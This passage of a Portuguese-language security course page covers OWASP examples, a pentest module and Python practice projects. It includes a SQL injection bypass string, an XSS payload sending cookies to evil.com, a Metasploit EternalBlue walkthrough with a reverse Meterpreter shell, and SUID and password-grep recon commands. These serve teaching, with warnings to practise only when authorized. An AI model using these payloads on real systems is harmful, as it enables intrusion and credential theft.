+              <tr><td>A04</td><td>Insecure Design</td><td>Falhas de design arquitetural</td></tr>
+              <tr><td>A05</td><td>Security Misconfiguration</td><td>Configuracoes padrao inseguras</td></tr>
+              <tr><td>A06</td><td>Vulnerable Components</td><td>Componentes desatualizados</td></tr>
+              <tr><td>A07</td><td>Auth Failures</td><td>Falhas em autenticacao e sessao</td></tr>
+              <tr><td>A08</td><td>Data Integrity Failures</td><td>Falhas em integridade de dados</td></tr>
+              <tr><td>A09</td><td>Logging Failures</td><td>Falta de logs e monitoramento</td></tr>
+              <tr><td>A10</td><td>SSRF</td><td>Server-Side Request Forgery</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>7.3 SQL Injection</h3>
+        <p><strong>Codigo VULNERAVEL:</strong></p>
+        <pre data-lang="python"><code class="language-python"># NUNCA FACA ISSO!
+cursor.execute(f"SELECT * FROM usuarios WHERE user='{usuario}' AND pass='{senha}'")</code></pre>
+        <p>Se o usuario digitar: <code>admin' OR '1'='1</code></p>
+        <p>A query vira: <code>SELECT * FROM usuarios WHERE user='admin' OR '1'='1' AND pass='...'</code> → Login bypassado!</p>
+        <p><strong>Codigo SEGURO (Prepared Statements):</strong></p>
+        <pre data-lang="python"><code class="language-python"># FORMA CORRETA
+cursor.execute("SELECT * FROM usuarios WHERE user=%s AND pass=%s", (usuario, senha))</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>7.4 XSS (Cross-Site Scripting)</h3>
+        <p><strong>Vulneravel:</strong></p>
+        <pre data-lang="html"><code class="language-html">&lt;!-- Entrada do usuario exibida diretamente --&gt;
+&lt;p&gt;Bem-vindo, &lt;?php echo $_GET['nome']; ?&gt;&lt;/p&gt;</code></pre>
+        <p>Ataque: <code>?nome=&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code></p>
+        <p><strong>Seguro:</strong></p>
+        <pre data-lang="python"><code class="language-python">import html
+nome_seguro = html.escape(nome_usuario)  # Converte &lt; para &amp;lt;, &gt; para &amp;gt;, etc.</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>7.5 CSRF (Cross-Site Request Forgery)</h3>
+        <p><strong>Protecao com Token:</strong></p>
+        <pre data-lang="python"><code class="language-python">import secrets
+
+# Gerar token CSRF
+csrf_token = secrets.token_urlsafe(32)
+
+# No formulario HTML
+# &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;
+
+# Verificar no servidor
+def processar_requisicao(request):
+    if request.form.get("csrf_token") != session.get("csrf_token"):
+        return "CSRF detectado!", 403</code></pre>
+      </div>
+
+      <div class="alert gold">
+        <strong>Pratique de forma autorizada:</strong> a PortSwigger Web Security Academy oferece labs gratuitos de OWASP Top 10, XSS, SQLi e CSRF em ambiente legal e controlado.
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="07"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 08 -->
+    <section class="section" id="mod08" data-mod="08">
+      <div class="section-header">
+        <h2>Módulo 08 — Ethical Hacking e Pentest</h2>
+        <span class="section-tag danger">Intermediario -> Avancado</span>
+        <span class="est-time">~65 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="08">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="alert danger">
+        <strong>Somente em ambientes autorizados:</strong> as técnicas abaixo devem ser aplicadas exclusivamente em laboratórios próprios, ambientes de CTF ou mediante contrato/autorização formal por escrito (regra de engajamento). Uso não autorizado é crime.
+      </div>
+
+      <div class="card">
+        <h3>8.1 Metodologia de Pentest</h3>
+        <pre data-lang="fluxo"><code>1. Planejamento -> Escopo, regras, autorizacao escrita
+2. Reconhecimento -> Coleta passiva e ativa de informacoes
+3. Enumeracao -> Identificar servicos, usuarios, versoes
+4. Vulnerabilidade -> Scan de vulnerabilidades conhecidas
+5. Exploracao -> Tentar explorar falhas encontradas
+6. Pos-exploracao -> Escalar privilegios, pivoting
+7. Relatorio -> Documentar achados e recomendacoes</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>8.2 Ferramentas Essenciais</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Ferramenta</th><th>Funcao</th></tr></thead>
+            <tbody>
+              <tr><td>Nmap</td><td>Scanner de portas e servicos</td></tr>
+              <tr><td>Nikto</td><td>Scanner de vulnerabilidades web</td></tr>
+              <tr><td>Burp Suite</td><td>Proxy e scanner de aplicacoes web</td></tr>
+              <tr><td>OWASP ZAP</td><td>Alternativa open-source ao Burp</td></tr>
+              <tr><td>Metasploit</td><td>Framework de exploracao</td></tr>
+              <tr><td>Wireshark</td><td>Analise de pacotes</td></tr>
+              <tr><td>John the Ripper</td><td>Quebra de hashes</td></tr>
+              <tr><td>Hashcat</td><td>Quebra de hashes (GPU)</td></tr>
+              <tr><td>Aircrack-ng</td><td>Auditoria de redes Wi-Fi</td></tr>
+              <tr><td>Sqlmap</td><td>Automacao de SQL Injection</td></tr>
+              <tr><td>Gobuster/Dirb</td><td>Enumeracao de diretorios</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>8.3 Nmap — Comandos Essenciais</h3>
+        <pre data-lang="bash"><code class="language-bash"># Scan basico
+nmap 192.168.1.1
+
+# Scan de todas as portas
+nmap -p- 192.168.1.1
+
+# Scan com deteccao de SO e versoes
+nmap -A 192.168.1.1
+
+# Scan silencioso (SYN)
+nmap -sS 192.168.1.1
+
+# Scan UDP
+nmap -sU 192.168.1.1
+
+# Scan de rede inteira
+nmap 192.168.1.0/24
+
+# Scan com scripts NSE (vuln scan)
+nmap --script vuln 192.168.1.1
+
+# Scan rapido das top 1000 portas
+nmap -F 192.168.1.1
+
+# Output em todos formatos
+nmap -A -oA resultado 192.168.1.1</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Flag</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>nmap &lt;ip&gt;</code></td><td>Scan padrão: testa as ~1000 portas TCP mais comuns usando conexão completa (3-way handshake)</td></tr>
+              <tr><td><code>-p-</code></td><td>Escaneia <strong>todas</strong> as 65535 portas TCP, em vez de só as mais comuns — mais lento, porém completo</td></tr>
+              <tr><td><code>-A</code></td><td>Ativa detecção agressiva: sistema operacional (<code>-O</code>), versão de serviços (<code>-sV</code>), scripts padrão (<code>-sC</code>) e traceroute juntos</td></tr>
+              <tr><td><code>-sS</code></td><td>Scan "SYN stealth": envia apenas o primeiro pacote do handshake TCP e nunca completa a conexão — mais discreto e mais rápido, mas requer privilégios de root/administrador</td></tr>
+              <tr><td><code>-sU</code></td><td>Escaneia portas UDP em vez de TCP (mais lento, pois UDP não confirma recebimento)</td></tr>
+              <tr><td><code>192.168.1.0/24</code></td><td>Notação CIDR: escaneia a faixa inteira de 256 endereços da sub-rede de uma vez</td></tr>
+              <tr><td><code>--script vuln</code></td><td>Roda a categoria de scripts NSE (Nmap Scripting Engine) voltada a identificar vulnerabilidades conhecidas nos serviços encontrados</td></tr>
+              <tr><td><code>-F</code></td><td>"Fast": limita o scan às 100 portas mais comuns (mais rápido que o padrão de ~1000)</td></tr>
+              <tr><td><code>-oA resultado</code></td><td>Salva a saída em três formatos simultâneos (<code>.nmap</code>, <code>.xml</code>, <code>.gnmap</code>) com o prefixo "resultado", útil para depois importar em outra ferramenta ou gerar relatório</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>8.4 Metasploit — Conceitos</h3>
+        <pre data-lang="bash"><code class="language-bash"># Iniciar Metasploit
+msfconsole
+
+# Buscar exploit
+search ms17-010
+
+# Usar exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Ver opcoes
+show options
+
+# Configurar alvo
+set RHOSTS 192.168.1.10
+
+# Ver payloads disponiveis
+show payloads
+
+# Selecionar payload
+set payload windows/x64/meterpreter/reverse_tcp
+
+# Configurar IP local
+set LHOST 192.168.1.5
+
+# Executar
+exploit</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Comando</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>msfconsole</code></td><td>Abre o console interativo do Metasploit Framework, onde todos os comandos seguintes são digitados</td></tr>
+              <tr><td><code>search ms17-010</code></td><td>Busca no banco de módulos do Metasploit por exploits, scanners ou payloads relacionados ao termo (aqui, a vulnerabilidade EternalBlue)</td></tr>
+              <tr><td><code>use &lt;caminho/do/exploit&gt;</code></td><td>Carrega um módulo específico como o módulo ativo da sessão atual, habilitando seus comandos e opções</td></tr>
+              <tr><td><code>show options</code></td><td>Lista todos os parâmetros configuráveis do módulo carregado (obrigatórios e opcionais) e seus valores atuais</td></tr>
+              <tr><td><code>set RHOSTS &lt;ip&gt;</code></td><td>Define o(s) host(s) alvo (Remote Host) que o exploit vai atacar</td></tr>
+              <tr><td><code>show payloads</code></td><td>Lista os payloads compatíveis com o exploit selecionado — o payload é o código que roda na máquina alvo após a exploração bem-sucedida</td></tr>
+              <tr><td><code>set payload &lt;caminho&gt;</code></td><td>Define qual payload será entregue (aqui, um Meterpreter reverso para Windows 64-bit)</td></tr>
+              <tr><td><code>set LHOST &lt;ip&gt;</code></td><td>Define o IP local (Local Host, sua máquina atacante) para onde a conexão reversa do payload vai se conectar</td></tr>
+              <tr><td><code>exploit</code></td><td>Executa o módulo carregado com as opções configuradas, tentando efetivamente comprometer o alvo</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="alert gold">
+        <strong>Pratique de forma autorizada:</strong> plataformas como TryHackMe e Hack The Box oferecem máquinas vulneráveis criadas propositalmente para treino legal de pentest.
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="08"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 09 -->
+    <section class="section" id="mod09" data-mod="09">
+      <div class="section-header">
+        <h2>Módulo 09 — Linux Avancado para Seguranca</h2>
+        <span class="section-tag">Intermediario</span>
+        <span class="est-time">~45 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="09">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>9.1 Comandos Avancados</h3>
+        <pre data-lang="bash"><code class="language-bash"># ============================================
+# BUSCA E FILTRO
+# ============================================
+
+# Encontrar arquivos
+find / -name "*.conf" 2&gt;/dev/null
+find /var/log -name "*.log" -mtime -7  # Ultimos 7 dias
+find / -perm -4000 2&gt;/dev/null        # Arquivos SUID (privesc)
+
+# Busca em arquivos
+grep -r "password" /etc/ 2&gt;/dev/null
+grep -i "error" /var/log/syslog
+grep -E "(error|fail|denied)" /var/log/auth.log
+
+# ============================================
+# PERMISSOES ESPECIAIS
+# ============================================
+
+# SUID - executa como dono do arquivo
+chmod u+s /usr/bin/programa
+
+# SGID - executa como grupo do arquivo
+chmod g+s /usr/bin/programa
+
+# Sticky Bit - apenas dono pode deletar
+chmod +t /diretorio_compartilhado
+
+# ============================================
+# REDIRECIONAMENTO
+# ============================================
+
+comando &gt; arquivo.txt     # Saida para arquivo (sobrescreve)
+comando &gt;&gt; arquivo.txt    # Saida para arquivo (append)
+comando 2&gt; erro.log       # Erros para arquivo
+comando &amp;&gt; tudo.log       # Saida + erros
+comando | grep "ok"       # Pipe: saida como entrada
+
+# ============================================
+# CRON (AGENDAMENTO)
+# ============================================
+
+# Editar crontab
+crontab -e
+
+# Formato: minuto hora dia_mes mes dia_semana comando
+# Backup diario as 2h da manha
+0 2 * * * /home/usuario/backup.sh
+
+# Scan de seguranca toda segunda as 9h
+0 9 * * 1 /home/usuario/security_scan.sh
+
+# Ver crontabs de todos usuarios
+for user in $(cut -f1 -d: /etc/passwd); do
+    echo "=== $user ==="
+    crontab -u $user -l 2&gt;/dev/null
+done
+
+# ============================================
+# REDE AVANCADA
+# ============================================
+
+# Capturar pacotes (tcpdump)
+sudo tcpdump -i eth0 -w captura.pcap
+tcpdump -i any port 80
+tcpdump -i any host 192.168.1.1
+
+# Monitorar conexoes em tempo real
+watch -n 1 'ss -tulpn'
+
+# Rastrear rota
+traceroute google.com
+mtr google.com  # Combina ping + traceroute
+
+# Ver tabela ARP
+arp -a
+ip neigh</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>9.2 Shell Scripting para Seguranca</h3>
+        <pre data-lang="bash"><code class="language-bash">#!/bin/bash
+# ============================================
+# SCRIPT: Verificador de Integridade de Arquivos
+# ============================================
+
+DIRETORIO="/etc"
+ARQUIVO_HASH="/var/log/integrity_hashes.txt"
+
+if [ "$1" == "--init" ]; then
+    echo "Gerando hashes baseline..."
+    find "$DIRETORIO" -type f -exec md5sum {} + &gt; "$ARQUIVO_HASH"
+    echo "Baseline salvo em $ARQUIVO_HASH"
+
+elif [ "$1" == "--check" ]; then
+    echo "Verificando integridade..."
+    md5sum -c "$ARQUIVO_HASH" 2&gt;/dev/null | grep -v "OK$"
+
+else
+    echo "Uso: $0 --init | --check"
+fi</code></pre>
+        <pre data-lang="bash"><code class="language-bash">#!/bin/bash
+# ============================================
+# SCRIPT: Monitor de Tentativas de Login Falhas
+# ============================================
+
+LIMITE=5
+LOG="/var/log/auth.log"
+
+# Contar falhas por IP
+mapfile -t IPS &lt; &lt;(grep "Failed password" "$LOG" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | awk -v lim="$LIMITE" '$1 &gt;= lim {print $2}')
+
+echo "=== IPs com $LIMITE+ tentativas falhas ==="
+for ip in "${IPS[@]}"; do
+    tentativas=$(grep -c "Failed password.*$ip" "$LOG")
+    echo "$ip -&gt; $tentativas tentativas"
+
+    # Opcional: bloquear com iptables
+    # iptables -A INPUT -s "$ip" -j DROP
+done</code></pre>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="09"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 10 -->
+    <section class="section" id="mod10" data-mod="10">
+      <div class="section-header">
+        <h2>Módulo 10 — Projetos Praticos de Programacao</h2>
+        <span class="section-tag">Intermediario</span>
+        <span class="est-time">~110 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="10">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>10.1 Projeto 1: Scanner de Portas Avancado</h3>
+        <pre data-lang="python"><code class="language-python">#!/usr/bin/env python3
+"""
+Scanner de Portas Avancado
+Uso: python scanner.py &lt;IP&gt; [porta_inicial] [porta_final]
+"""
+
+import socket
+import sys
+import threading
+from datetime import datetime
+
+class PortScanner:
+    def __init__(self, alvo, inicio=1, fim=1024, threads=100):
+        self.alvo = alvo
+        self.inicio = inicio
+        self.fim = fim
+        self.threads = threads
+        self.abertas = []
+        self.lock = threading.Lock()
+
+        # Mapeamento de portas conhecidas
+        self.servicos = {
+            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
+            443: "HTTPS", 3306: "MySQL", 3389: "RDP",
+            5432: "PostgreSQL", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
+        }
+
+    def scan_porta(self, porta):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            resultado = s.connect_ex((self.alvo, porta))
+            s.close()
+
+            if resultado == 0:
+                servico = self.servicos.get(porta, "Desconhecido")
+                with self.lock:
+                    self.abertas.append((porta, servico))
+                    print(f"  [+] Porta {porta}/tcp ABERTA -&gt; {servico}")
+        except Exception:
+            pass
+
+    def executar(self):
+        print(f"\n{'='*50}")
+        print(f"Scanner de Portas")
+        print(f"Alvo: {self.alvo}")
+        print(f"Portas: {self.inicio}-{self.fim}")
+        print(f"Inicio: {datetime.now().strftime('%H:%M:%S')}")
+        print(f"{'='*50}\n")
+
+        threads_list = []
+        for porta in range(self.inicio, self.fim + 1):
+            while threading.active_count() &gt; self.threads + 10:
+                pass
+
+            t = threading.Thread(target=self.scan_porta, args=(porta,))
+            t.start()
+            threads_list.append(t)
+
+        for t in threads_list:
+            t.join()
+
+        print(f"\n{'='*50}")
+        print(f"Scan concluido!")
+        print(f"Portas abertas encontradas: {len(self.abertas)}")
+        print(f"Fim: {datetime.now().strftime('%H:%M:%S')}")
+        print(f"{'='*50}")
+
+        return self.abertas
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        print("Uso: python scanner.py &lt;IP&gt; [inicio] [fim]")
+        sys.exit(1)
+
+    alvo = sys.argv[1]
+    inicio = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 1
+    fim = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 1024
+
+    scanner = PortScanner(alvo, inicio, fim)
+    scanner.executar()</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>10.2 Projeto 2: Gerenciador de Senhas (CLI)</h3>
+        <pre data-lang="python"><code class="language-python">#!/usr/bin/env python3
+"""
+Password Manager Seguro
+Armazena senhas criptografadas com AES
+"""
+
+import json
+import os
+import getpass
+import hashlib
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import base64
+
+class PasswordManager:
+    def __init__(self, arquivo="senhas_vault.json"):
+        self.arquivo = arquivo
+        self.dados = {}
+        self.fernet = None
+
+    def _derivar_chave(self, senha_mestre, salt=None):
+        if salt is None:
+            salt = os.urandom(16)
+
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=480000,
+        )
+        chave = base64.urlsafe_b64encode(kdf.derive(senha_mestre.encode()))
+        return chave, salt
+
+    def criar_vault(self, senha_mestre):
+        chave, salt = self._derivar_chave(senha_mestre)
+        self.fernet = Fernet(chave)
+
+        with open(".vault_salt", "wb") as f:
+            f.write(salt)
+
+        self._salvar()
+        print("Vault criado com sucesso!")
+
+    def abrir_vault(self, senha_mestre):
+        if not os.path.exists(".vault_salt"):
+            print("Vault nao encontrado. Crie um novo.")
+            return False
+
+        with open(".vault_salt", "rb") as f:
+            salt = f.read()
+
+        chave, _ = self._derivar_chave(senha_mestre, salt)
+        self.fernet = Fernet(chave)
+
+        try:
+            self._carregar()
+            print("Vault aberto!")
+            return True
+        except Exception:
+            print("Senha mestre incorreta!")
+            return False
+
+    def adicionar(self, servico, usuario, senha):
+        senha_cifrada = self.fernet.encrypt(senha.encode()).decode()
+        self.dados[servico] = {"usuario": usuario, "senha": senha_cifrada}
+        self._salvar()
+        print(f"Senha de '{servico}' salva.")
+
+    def recuperar(self, servico):
+        if servico not in self.dados:
+            print(f"Servico '{servico}' nao encontrado.")
+            return
+
+        entrada = self.dados[servico]
+        senha = self.fernet.decrypt(entrada["senha"].encode()).decode()
+        print(f"\n{servico}")
+        print(f"   Usuario: {entrada['usuario']}")
+        print(f"   Senha: {senha}")
+
+    def listar(self):
+        if not self.dados:
+            print("Vault vazio.")
+            return
+        print("\nServicos armazenados:")
+        for servico in self.dados:
+            print(f"   - {servico}")
+
+    def _salvar(self):
+        with open(self.arquivo, "w") as f:
+            json.dump(self.dados, f, indent=2)
+
+    def _carregar(self):
+        if os.path.exists(self.arquivo):
+            with open(self.arquivo, "r") as f:
+                conteudo = f.read()
+                if conteudo:
+                    self.dados = json.loads(conteudo)
+
+def main():
+    pm = PasswordManager()
+
+    print("="*40)
+    print("PASSWORD MANAGER SEGURO")
+    print("="*40)
+
+    if not os.path.exists(".vault_salt"):
+        print("\nCriando novo vault...")
+        senha = getpass.getpass("Crie uma senha mestre forte: ")
+        pm.criar_vault(senha)
+    else:
+        senha = getpass.getpass("Digite a senha mestre: ")
+        if not pm.abrir_vault(senha):
+            return
+
+    while True:
+        print("\n[1] Adicionar senha")
+        print("[2] Recuperar senha")
+        print("[3] Listar servicos")
+        print("[4] Sair")
+        opcao = input("\nEscolha: ")
+
+        if opcao == "1":
+            servico = input("Servico: ")
+            usuario = input("Usuario: ")
+            senha = getpass.getpass("Senha: ")
+            pm.adicionar(servico, usuario, senha)
+        elif opcao == "2":
+            servico = input("Servico: ")
+            pm.recuperar(servico)
+        elif opcao == "3":
+            pm.listar()
+        elif opcao == "4":
+            print("Ate logo!")
+            break
+
+if __name__ == "__main__":
+    main()</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>10.3 Projeto 3: Sistema de Login com Hash e JWT</h3>
+        <pre data-lang="python"><code class="language-python">#!/usr/bin/env python3
+"""
+Sistema de Login Seguro
+- Senhas com PBKDF2
+- Tokens JWT simples (educacional)
+"""
+
+import hashlib
+import hmac
+import base64
+import json
+import time
+import os
+from getpass import getpass
+
+USUARIOS_DB = "usuarios_db.json"
+SECRET_KEY = os.urandom(32)  # Em producao, use variavel de ambiente
+
+class SistemaLogin:
+    def __init__(self):
+        self.usuarios = self._carregar_db()
+
+    def _carregar_db(self):
+        if os.path.exists(USUARIOS_DB):
+            with open(USUARIOS_DB, "r") as f:
+                return json.load(f)
+        return {}
+
+    def _salvar_db(self):
+        with open(USUARIOS_DB, "w") as f:
+            json.dump(self.usuarios, f, indent=2)
+
+    def _hash_senha(self, senha, salt=None):
+        if salt is None:
+            salt = os.urandom(16)
+        hash_bytes = hashlib.pbkdf2_hmac('sha256', senha.encode(), salt, 100000)
+        return base64.b64encode(salt + hash_bytes).decode()
+
+    def _verificar_senha(self, senha, hash_armazenado):
+        dados = base64.b64decode(hash_armazenado.encode())
+        salt = dados[:16]
+        hash_novo = self._hash_senha(senha, salt)
+        return hmac.compare_digest(hash_armazenado, hash_novo)
+
+    def registrar(self, usuario, senha):
+        if usuario in self.usuarios:
+            print("Usuario ja existe!")
+            return False
+
+        if len(senha) &lt; 8:
+            print("Senha deve ter no minimo 8 caracteres!")
+            return False
+
+        hash_senha = self._hash_senha(senha)
+        self.usuarios[usuario] = {
+            "hash": hash_senha,
+            "criado_em": time.strftime("%Y-%m-%d %H:%M:%S")
+        }
+        self._salvar_db()
+        print(f"Usuario '{usuario}' registrado!")
+        return True
+
+    def login(self, usuario, senha):
+        if usuario not in self.usuarios:
+            print("Usuario nao encontrado!")
+            return None
+
+        if not self._verificar_senha(senha, self.usuarios[usuario]["hash"]):
+            print("Senha incorreta!")
+            return None
+
+        token = self._gerar_jwt(usuario)
+        print(f"Login bem-sucedido! Token gerado.")
+        return token
+
+    def _gerar_jwt(self, usuario):
+        header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
+        payload = base64.urlsafe_b64encode(json.dumps({
+            "sub": usuario,
+            "iat": int(time.time()),
+            "exp": int(time.time()) + 3600
+        }).encode()).decode().rstrip("=")
+
+        assinatura = hmac.new(SECRET_KEY, f"{header}.{payload}".encode(), hashlib.sha256).digest()
+        assinatura_b64 = base64.urlsafe_b64encode(assinatura).decode().rstrip("=")
+
+        return f"{header}.{payload}.{assinatura_b64}"
+
+    def verificar_token(self, token):
+        try:
+            partes = token.split(".")
+            if len(partes) != 3:
+                return False
+
+            payload_json = base64.urlsafe_b64decode(partes[1] + "==").decode()
+            payload = json.loads(payload_json)
+
+            if payload.get("exp", 0) &lt; time.time():
+                print("Token expirado!")
+                return False
+
+            assinatura_esperada = hmac.new(SECRET_KEY, f"{partes[0]}.{partes[1]}".encode(), hashlib.sha256).digest()
+            assinatura_recebida = base64.urlsafe_b64decode(partes[2] + "==")
+
+            if hmac.compare_digest(assinatura_esperada, assinatura_recebida):
+                print(f"Token valido! Usuario: {payload['sub']}")
+                return True
+            return False
+        except Exception as e:
+            print(f"Token invalido: {e}")
+            return False
+
+def main():
+    sistema = SistemaLogin()
+
+    print("="*40)
+    print("SISTEMA DE LOGIN SEGURO")
+    print("="*40)
+
+    while True:
+        print("\n[1] Registrar")
+        print("[2] Login")
+        print("[3] Verificar Token")
+        print("[4] Sair")
+        opcao = input("\nEscolha: ")
+
+        if opcao == "1":
+            usuario = input("Usuario: ")
+            senha = getpass("Senha: ")
+            sistema.registrar(usuario, senha)
+        elif opcao == "2":
+            usuario = input("Usuario: ")
+            senha = getpass("Senha: ")
+            token = sistema.login(usuario, senha)
+            if token:
+                print(f"\nSeu token: {token[:50]}...")
+        elif opcao == "3":
+            token = input("Cole o token: ")
+            sistema.verificar_token(token)
+        elif opcao == "4":
+            print("Ate logo!")
+            break
+
+if __name__ == "__main__":
+    main()</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>10.4 Projeto 4: Firewall Simples (Python + iptables)</h3>
+        <pre data-lang="python"><code class="language-python">#!/usr/bin/env python3
+"""
+Firewall Simples
+Bloqueia IPs suspeitos baseado em tentativas de conexao
+REQUER ROOT para executar comandos iptables
+"""
+
+import os
+import re
+import time
+import subprocess
+from collections import defaultdict
+from datetime import datetime
+
+class FirewallSimples:
+    def __init__(self):
+        self.tentativas = defaultdict(int)
+        self.bloqueados = set()
+        self.limite = 5
+        self.janela = 60
+        self.log_file = "/var/log/auth.log"
+
+    def analisar_logs(self):
+        try:
+            with open(self.log_file, "r") as f:
+                linhas = f.readlines()
+
+            for linha in linhas[-1000:]:
+                match = re.search(r"Failed password.*from\s+(\d+\.\d+\.\d+\.\d+)", linha)
+                if match:
+                    ip = match.group(1)
+                    self.tentativas[ip] += 1
+
+            return self.tentativas
+        except FileNotFoundError:
+            print(f"Arquivo {self.log_file} nao encontrado.")
+            return {}
+
+    def bloquear_ip(self, ip):
+        if ip in self.bloqueados:
+            return
+
+        try:
+            subprocess.run(
+                ["iptables", "-A", "INPUT", "-s", ip, "-j", "DROP"],
+                check=True, capture_output=True
+            )
+            self.bloqueados.add(ip)
+            print(f"IP {ip} bloqueado! ({self.tentativas[ip]} tentativas)")
+        except subprocess.CalledProcessError as e:
+            print(f"Erro ao bloquear {ip}: {e}")
+
+    def monitorar(self):
+        print(f"Firewall ativo - Limite: {self.limite} tentativas")
+        print("Pressione Ctrl+C para parar\n")
+
+        try:
+            while True:
+                self.tentativas.clear()
+                self.analisar_logs()
+
+                for ip, count in self.tentativas.items():
+                    if count &gt;= self.limite and ip not in self.bloqueados:
+                        self.bloquear_ip(ip)
+
+                time.sleep(self.janela)
+        except KeyboardInterrupt:
+            print("\nFirewall desativado.")
+
+    def listar_regras(self):
+        result = subprocess.run(["iptables", "-L", "INPUT", "-n", "--line-numbers"],
+                            capture_output=True, text=True)
+        print(result.stdout)
+
+    def limpar_regras(self):
+        subprocess.run(["iptables", "-F", "INPUT"], check=True)
+        self.bloqueados.clear()
+        print("Regras limpas!")
+
+if __name__ == "__main__":
+    import sys
+    fw = FirewallSimples()
+
+    if len(sys.argv) &gt; 1:
+        if sys.argv[1] == "monitor":
+            fw.monitorar()
+        elif sys.argv[1] == "list":
+            fw.listar_regras()
+        elif sys.argv[1] == "clear":
+            fw.limpar_regras()
+    else:
+        print("Uso: sudo python firewall.py [monitor|list|clear]")</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>10.5 Projeto 5: Packet Sniffer Simples</h3>
+        <pre data-lang="python"><code class="language-python">#!/usr/bin/env python3
+"""
+Packet Sniffer Educacional
+Captura pacotes TCP e exibe informacoes basicas
+REQUER ROOT (raw sockets)
+"""
+
+import socket
+import struct
+import textwrap
+
+class PacketSniffer:
+    def __init__(self):
+        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
+
+    def formatar_multi_linhas(self, prefixo, string, tamanho=80):
+        tamanho -= len(prefixo)
+        if isinstance(string, bytes):
+            string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
+            if tamanho % 2:
+                tamanho -= 1
+        return '\n'.join([prefixo + line for line in textwrap.wrap(string, tamanho)])
+
+    def analisar_ethernet(self, dados):
+        destino, origem, protocolo = struct.unpack('! 6s 6s H', dados[:14])
+        return self.bytes_para_mac(destino), self.bytes_para_mac(origem), socket.htons(protocolo), dados[14:]
+
+    def bytes_para_mac(self, bytes_mac):
+        return ':'.join(f'{b:02x}' for b in bytes_mac).upper()
+
+    def analisar_ipv4(self, dados):
+        versao_header = dados[0]
+        versao = versao_header &gt;&gt; 4
+        header_len = (versao_header &amp; 15) * 4
+        ttl, protocolo, origem, destino = struct.unpack('! 8x B B 2x 4s 4s', dados[:20])
+        return versao, header_len, ttl, protocolo, self.ipv4_para_str(origem), self.ipv4_para_str(destino), dados[header_len:]
+
+    def ipv4_para_str(self, addr):
+        return '.'.join(map(str, addr))
+
+    def analisar_tcp(self, dados):
+        origem_porta, destino_porta, sequencia, acknowledge, offset_flags = struct.unpack('! H H L L H', dados[:14])
+        offset = (offset_flags &gt;&gt; 12) * 4
+        flag_urg = (offset_flags &amp; 32) &gt;&gt; 5
+        flag_ack = (offset_flags &amp; 16) &gt;&gt; 4
+        flag_psh = (offset_flags &amp; 8) &gt;&gt; 3
+        flag_rst = (offset_flags &amp; 4) &gt;&gt; 2
+        flag_syn = (offset_flags &amp; 2) &gt;&gt; 1
+        flag_fin = offset_flags &amp; 1
+        return origem_porta, destino_porta, sequencia, acknowledge, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, dados[offset:]
+
+    def capturar(self):
+        print("Sniffer iniciado. Pressione Ctrl+C para parar.\n")
+        try:
+            while True:
+                dados_brutos, addr = self.sock.recvfrom(65535)
+                mac_dest, mac_orig, eth_proto, dados = self.analisar_ethernet(dados_brutos)
+
+                if eth_proto == 8:  # IPv4
+                    versao, header_len, ttl, protocolo, origem, destino, dados = self.analisar_ipv4(dados)
+
+                    if protocolo == 6:  # TCP
